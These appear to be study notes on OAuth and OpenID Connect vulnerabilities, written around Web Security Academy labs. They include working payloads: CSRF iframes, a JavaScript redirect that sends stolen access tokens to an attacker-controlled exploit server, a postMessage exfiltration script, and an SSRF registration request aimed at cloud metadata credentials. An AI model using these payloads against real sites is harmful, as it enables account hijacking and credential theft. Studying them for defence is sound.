### Recon
Once you know the hostname of the authorization server, you should always try sending a GET request to the following standard endpoints: 
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```
These will often return a JSON configuration file containing key information, such as details of additional features that may be supported. This will sometimes tip you off about a wider attack surface and supported features that may not be mentioned in the documentation. 

### Improper implementation of the implicit grant type
#### Lab: Authentication bypass via OAuth implicit flow
After all the stuff (e.g.: providing your username and password and later confirming that we agree to share e.g. email with current website) with the OAuth service provider is done
We will be redirected back to the url that we provided initially in the `authorization` request.
e.g.: if the the initial request was:
```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```
Then after the stuff with OAuth server provider is done we'll be redirected to 
```
https://client-app.com/callback
```
Most likely the redirection request will contain access token which server often use instead of the user password:
```
GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com
```
`/callback` endpoint will probably attempt to sign up our user by making a req:
```
POST /authenticate HTTP/2
Body: {"email":"wiener@any.net","username":"wiener","token":"1Dm7VfzLLbfOz1IQtAf8rVUyFQpmKEtJcGFiL2a0ZOi"}
```
If the `token` is not validated on the backend then we can change `email` prop to email of another victim and as a result we'll get a cookie that contains info about our victim.
With that cookie (that we'll get as a response) we'll be able to log in into victim's account.

### Flawed CSRF protection
If OAuth flow does not contain `state` (AKA `nonce`) then there's a possibility for a csrf attack.

For example let's say there's a website that has both classic login (via email and password) and OAuth login via some OAuth service provider (e.g. facebook).
It also allows social profile attachment. In other words when we login with a classic login inside our account we can attach/link a facebook profile for example.
The flow for profile attachment starts for example in the following way:
```
GET <facebook.com>/auth?client_id=rqf4ev4ew21tiz6u5npzo&redirect_uri=https://lab.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/2
```
Then we're redirected to an OAuth service (e.g. facebook) login page where we provide our username and pass and then we're shown what the website wants to access info to copy form facebook

And if we confirm that we allow the website to access that info then we're redirected to the website with the url provided in `redirect_uri` which we provided in the initial `<facebook>/auth` req.

In the example above that url was: `https://lab.web-security-academy.net/oauth-linking`

So facebook will call that page with additional params:
```
/oauth-linking?code=YfDYLNzbX_YEhRQ2uc5u5j-DLleFa-pX38aCoh7GPJg
```

**Notice that in this particular case /oauth-linking is called only with `code` param but without `state/nonce` param, which means we can abuse this with csrf** 

Later this `/oauth-linking` endpoint takes value of `code` param and associates it with user session.
The backend server will later call OAuth service server to exchange `code` to `access_token` and will remember that the user from session has attached this facebook account.

On the login page there are 2 different ways to login:
classic and via oauth service (e.g. facebook)
So now we can login to our user not with a classic login but with an oauth login.

#### Exploiting flawed csrf protection
#### Lab: Forced OAuth profile linking
For this attack to work we need:
- 2 logIn options: 1) regular website login and 2) login via social media account. 
- absence of `state` (AKA `nonce`) param  

Since there's no `state` (AKA `nonce`) param we can do the following:
Log in to our own account and press `attach account` which will trigger the following req:
```
/auth?client_id=rqf4ev4ew21tiz6u5npzo&redirect_uri=https://lab.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email
```
Then provide our social media username and password and then confirm that we allow sharing data with the website
Then we will be redirected to the url that we provided in `redirect_uri` but `code` param will be added: 
```
/oauth-linking?code=YfDYLNzbX_YEhRQ2uc5u5j-DLleFa-pX38aCoh7GPJg
```
**We need to stop and drop that request, because we don't want this `code` to be linked to our user, we want to use this `code` to be linked to another account (which we're trying to hack)**

Then we need another user to have an active session cookie (to be logged in on the website)
If they are logged in we send them the following csrf payload
```
<iframe src="https://0a4e007b03d775fe8130acc100cf00bf.web-security-academy.net/oauth-linking?code=lQYnxAzzJ3lMit-KHmYwDk4O6Y3cg2JjeFamJ7WC3aR"></iframe>
```
And when they click it - they basically finish oauth flow that we started and our facebook profile is attached to their account on the website.

On the website there is a way to login via Oauth provider (e.g. facebook) credentials. So when we do that with credentials of out own facebook we are logged into another user profile

> Note: if the site allows users to log in exclusively via OAuth, the state parameter is arguably less critical. However, not using a state parameter can still allow attackers to construct login CSRF attacks, whereby the user is tricked into logging in to the attacker's account.

### Leaking authorization codes and access tokens (stealing code or access_token of other users)
#### Lab: OAuth account hijacking via redirect_uri
For this attack to be possible we need OAuth service to not validate `redirect_uri`

e.g.: The start of OAuth:
```
GET /auth?client_id=lcco8byen9ljlmx92n4fg&redirect_uri=https://lab.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email
```
After that we provide credentials and confirm scope. OAuth service stores `_session` cookie for us (so that we don't have to type login/pass and don't have to confirm scope again in the future if we hit `/auth?client_id-...` endpoint again in the future) and we're redirected to the url that was specified as `redirect_uri` with the code as a url param:
```
GET /oauth-callback?code=RlG7wZK0-sgn3_r2OMyitW7ab66P8KPD-gkzkdTvwi4
```
We can craft the following exploit:
```
<iframe src="https://oauth-0ad80044034fed6c80df5124028e0050.oauth-server.net/auth?client_id=cwdqr3bzru814gsihbp9f&redirect_uri=https://exploit-0a61005d0306ed2d80f1520a0175009b.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email"></iframe>
```
Notice that we changed `redirect_uri` to our own server that we can control.
Now we need to deliver that exploit to the victim.
After victim clicks on it, browser will make a request to the OAuth service provider together with `_session` cookie for that OAuth service.
OAuth service will see that the `_session` cookie is already there therefore it will not ask to provide login, password and will not ask to confirm scope. And if OAuth server is misconfigured in a way that it doesn't check `redirect_uri` then it will make a request to whatever was specified in `redirect_uri` (in our exploit we specified the server that we control) and OAuth will also attach `code` of the victim as a url param in the call to our own server.
For example:
```
GET /oauth-callback?code=RlG7wZK0-sgn3_r2OMyitW7ab66P8KPD-gkzkdTvwi4
```
Where `code` is the code that is issued by OAuth for the victim (so that later it could be exchanged for an access token).
We can then check the logs of our server and see the victim's OAuth `code`.

The callback endpoint:
```
GET /oauth-callback?code=RlG7wZK0-sgn3_r2OMyitW7ab66P8KPD-gkzkdTvwi4
```
actually stores that code on the backend and gives us back user `session` cookie (note this is not the same as `_session` cookie that we have with OAuth service).

So we don't need to go through OAuth flow but only need to call that last endpoint with the `code` that we stole from victim:
```
GET /oauth-callback?code=RlG7wZK0-sgn3_r2OMyitW7ab66P8KPD-gkzkdTvwi4
```
And we'll get victim's `session` cookie and will be able to log in as them.

### Flawed redirect_uri validation
Due to the kinds of attacks seen in the previous lab, it is best practice for client applications to provide a whitelist of their genuine callback URIs when registering with the OAuth service. This way, when the OAuth service receives a new request, it can validate the redirect_uri parameter against this whitelist. In this case, supplying an external URI will likely result in an error. However, there may still be ways to bypass this validation.

When auditing an OAuth flow, you should try experimenting with the redirect_uri parameter to understand how it is being validated. For example: 
- Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters i.e. an approved domain. You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error. 
-  If you can append extra values to the default redirect_uri parameter, you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. For example, you can try techniques such as:
https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
If you're not familiar with these techniques, we recommend reading our content on how to circumvent common SSRF defences and CORS. 
- You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate redirect_uri parameters as follows:
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
- Some servers also give special treatment to localhost URIs as they're often used during development. In some cases, any redirect URI beginning with localhost may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as localhost.evil-user.net. 

It is important to note that you shouldn't limit your testing to just probing the redirect_uri parameter in isolation. In the wild, you will often need to experiment with different combinations of changes to several parameters. Sometimes changing one parameter can affect the validation of others. For example, changing the response_mode from query to fragment can sometimes completely alter the parsing of the redirect_uri, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the web_message response mode is supported, this often allows a wider range of subdomains in the redirect_uri. 

### Lab: Stealing OAuth access tokens via an open redirect
Normal oauth implicit flow:
First the endpoint is hit:
```
GET /auth?client_id=mql1yse6vpmkaeohozcdh&redirect_uri=https://0a7e005f0376bcf1807721b000fb00dd.web-security-academy.net/oauth-callback&response_type=token&nonce=-130543437&scope=openid%20profile%20email HTTP/1.1
```
Then on oauth service page user provides their credentials and agrees to the scope (e.g. email)
and then is redirected to the `redirect_uri` that was specified in the first request. 
Example of a redirect from oauth:
```
HTTP/2 302 Found
Location: https://ff.web-security-academy.net/oauth-callback#access_token=ImLOukbIxMWIdzBOLSzy0V9L4EKnz5bwwO98pVLprKc&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```
As you can see it contains `access_token` in the url. (Which can also be accessed via `document.location.hash` BTW)

That `access_token` is later used in another request to the oauth service:
```
GET /me HTTP/2
Host: oauth-0acd00cc0315bc0580bc1fc6024b0017.oauth-server.net
Authorization: Bearer ImLOukbIxMWIdzBOLSzy0V9L4EKnz5bwwO98pVLprKc
```
Which responses:
```
{
    "sub":"wiener",
    "apikey":"ilEYaNYP3rb21bcKuXf3dGex0wDr3vbc",
    "name":"Peter Wiener",
    "email":"wiener@hotdog.com",
}
```

We want to steal `access_token` from user but we can't specify their own server in `redirect_uri`. But we see that **`redirect_uri` is vulnerable to path traversal**.

Further site exploration reveals that there's an open redirect vulnerability:
```bash
<a href="/post/next?path=/post?postId=7">| Next post</a>
```

Specifically `?path` url query param can be changed to a url of our own external server

Therefore we can change `redirect_uri`:
```
?redirect_uri=https://ff.web-security-academy.net/oauth-callback/../post/next?path=${attackers_server_uri}
```

And therfore the exploit can look like the following:
```bash
<html>
    <script>
        const attackers_server_uri = "https://exploit-ff.exploit-server.net/exploit"
        const redirect_uri = `https://ff.web-security-academy.net/oauth-callback/../post/next?path=${attackers_server_uri}`

        document.location = `https://oauth-ff.oauth-server.net/auth?client_id=mql1yse6vpmkaeohozcdh&redirect_uri=${redirect_uri}&response_type=token&nonce=-626744892&scope=openid%20profile%20emaill`
    </script>
</html>
```

Lab specific problem:
In the lab we have to use the same `/exploit` url of the same exploit server for exploit delivery and for extraction of `access_token` from the url after the user is redirected back from the oauth service to our exploit server. That's why we need to have a bit more trickier exploit:
```bash
<html>
    <script>
        if (!document.location.hash) {
            const attackers_server_uri = "https://exploit-0a9e0082035bbcde80c320f6018700ee.exploit-server.net/exploit"
            const redirect_uri = `https://0a7e005f0376bcf1807721b000fb00dd.web-security-academy.net/oauth-callback/../post/next?path=${attackers_server_uri}`

            document.location = `https://oauth-0acd00cc0315bc0580bc1fc6024b0017.oauth-server.net/auth?client_id=mql1yse6vpmkaeohozcdh&redirect_uri=${redirect_uri}&response_type=token&nonce=-626744892&scope=openid%20profile%20emaill`
        } else {
            window.location = '/?'+document.location.hash.substr(1)
        }
    </script>
</html>
```

`document.location.hash` here is used for checking if the uri contains `access_token`
i.e. when redirecting back from oauth service, oauth service will attach `#access_token=` in the url:
```
HTTP/2 302 Found
Location: https://0a7e005f0376bcf1807721b000fb00dd.web-security-academy.net/oauth-callback#access_token=ImLOukbIxMWIdzBOLSzy0V9L4EKnz5bwwO98pVLprKc&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

Therefore we can check logs of our own external server and find that `access_token` there.

### Lab: Stealing OAuth access tokens via a proxy page
`redirect_uri` is vulnerable to directory traversal 
TODO: this lab does not work properly: after deliver exploit to victim, victim does not always makes a request to the exploit server

BTW: TODO: figure out why you're getting an error inside of an iframe

example of a solution:
```bash
<iframe src="https://oauth-0aa900560362c79580a2d84c02cb00ec.oauth-server.net/auth?client_id=uje8kqatmq881p5y2mjp7&redirect_uri=https://0ae300c703aac7548029daaf000a00d1.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1382260837&scope=openid%20profile%20email"></iframe>

<script>
    window.addEventListener('message', function(e) {
        const data = encodeURIComponent(e.data.data);
        fetch("/" + data)
    }, false)
</script>
```


## Flawed scope validation
In any OAuth flow, the user must approve the requested access based on the scope defined in the authorization request. The resulting token allows the client application to access only the scope that was approved by the user. But in some cases, it may be possible for an attacker to "upgrade" an access token (either stolen or obtained using a malicious client application) with extra permissions due to flawed validation by the OAuth service. The process for doing this depends on the grant type.

### Scope upgrade: authorization code flow
With the authorization code grant type, the user's data is requested and sent via secure server-to-server communication, which a third-party attacker is typically not able to manipulate directly. However, it may still be possible to achieve the same result by registering their own client application with the OAuth service.

For example, let's say the attacker's malicious client application initially requested access to the user's email address using the openid email scope. After the user approves this request, the malicious client application receives an authorization code. As the attacker controls their client application, they can add another scope parameter to the code/token exchange request containing the additional profile scope:
```
POST /token
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20 email%20profile
```
If the server does not validate this against the scope from the initial authorization request, it will sometimes generate an access token using the new scope and send this to the attacker's client application:
```
{
    "access_token": "z0y9x8w7v6u5",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid email profile",
    …
}
```
The attacker can then use their application to make the necessary API calls to access the user's profile data.

### Scope upgrade: implicit flow
For the implicit grant type, the access token is sent via the browser, which means an attacker can steal tokens associated with innocent client applications and use them directly. Once they have stolen an access token, they can send a normal browser-based request to the OAuth service's /userinfo endpoint, manually adding a new scope parameter in the process.

Ideally, the OAuth service should validate this scope value against the one that was used when generating the token, but this isn't always the case. As long as the adjusted permissions don't exceed the level of access previously granted to this client application, the attacker can potentially access additional data without requiring further approval from the user.

### Unverified user registration
When authenticating users via OAuth, the client application makes the implicit assumption that the information stored by the OAuth provider is correct. This can be a dangerous assumption to make.

Some websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address in some cases. An attacker can exploit this by registering an account with the OAuth provider using the same details as a target user, such as a known email address. Client applications may then allow the attacker to sign in as the victim via this fraudulent account with the OAuth provider.

## OpenID Connect
### Identifying OpenID Connect
Even if the login process does not initially appear to be using OpenID Connect, it is still worth checking whether the OAuth service supports it. You can simply try adding the openid scope or changing the response type to id_token and observing whether this results in an error.

As with basic OAuth, it's also a good idea to take a look at the OAuth provider's documentation to see if there's any useful information about their OpenID Connect support. You may also be able to access the configuration file from the standard endpoint /.well-known/openid-configuration.

### Unprotected dynamic client registration
The OpenID specification outlines a standardized way of allowing client applications to register with the OpenID provider. If dynamic client registration is supported, the client application can register itself by sending a POST request to a dedicated /registration endpoint. The name of this endpoint is usually provided in the configuration file and documentation.

In the request body, the client application submits key information about itself in JSON format. For example, it will often be required to include an array of whitelisted redirect URIs. It can also submit a range of additional information, such as the names of the endpoints they want to expose, a name for their application, and so on. A typical registration request may look something like this:
```
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
    "application_type": "web",
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
    "client_name": "My Application",
    "logo_uri": "https://client-app.com/logo.png",
    "token_endpoint_auth_method": "client_secret_basic",
    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
    "userinfo_encrypted_response_alg": "RSA1_5",
    "userinfo_encrypted_response_enc": "A128CBC-HS256",
    …
}
```
The OpenID provider should require the client application to authenticate itself. In the example above, they're using an HTTP bearer token. However, some providers will allow dynamic client registration without any authentication, which enables an attacker to register their own malicious client application. This can have various consequences depending on how the values of these attacker-controllable properties are used.

For example, you may have noticed that some of these properties can be provided as URIs. If any of these are accessed by the OpenID provider, this can potentially lead to second-order SSRF vulnerabilities unless additional security measures are in place.

### Lab: SSRF via OpenID dynamic client registration
Some OAuth providers allow dynamic client registration without any authentication

To check configuration of OAuth provider use the following url:
```
/.well-known/openid-configuration
```
e.g.:
```
https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration
```

In the response of configuration we got:
```
"registration_endpoint":"https://oauth-0ab1000b04cf85ab80a6c41b025f0095.oauth-server.net/reg"
```
We can use that endpoint to register our app in OAuth provider

During the OAuth flow audit we notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo.

This is fetched from `/client/CLIENT-ID/logo`. We know from the OpenID specification that client applications can provide the URL for their logo using the `logo_uri` property during dynamic registration

But instead of providing a valid logo url during dynamic oauth service registration we can provide a url of inner local network, e.g.:
```
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
}
```

And later when we make a request to get that logo from the OAuth service, the OAuth server will make a request to `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin` and will send a response from it to us

